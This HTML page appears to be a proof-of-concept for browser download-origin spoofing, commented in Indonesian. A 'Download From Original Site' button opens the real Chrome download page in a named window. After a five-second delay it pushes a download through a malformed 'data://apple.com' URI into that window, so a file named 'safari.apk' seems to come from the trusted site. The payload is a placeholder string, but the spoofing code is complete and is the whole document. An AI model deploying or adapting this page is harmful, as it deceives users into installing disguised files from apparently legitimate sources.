<html>
 <head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
    }
  </style>
 </head>
 <body>
  <script>
    // Download helper menggunakan malformed data URI
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      
      // Menargetkan window 'x' untuk mempertahankan konteks spoofing
      link.target = "x"; 
      
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    function a(){
      // 1. Buka situs asli di window/tab baru bernama 'x'
      window.open('https://www.google.com/intl/id_id/chrome/', 'x');
      
      // 2. Tunggu 5 detik, lalu jalankan trik download
      setTimeout(function(){
        Puf(
          "data://apple.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
          "safari.apk"
        );
      }, 5000);
    }
  </script>
  <center>
    <input type="button" class="button" value="Download From Original Site" onclick="a()">
  </center>
 </body>
</html>
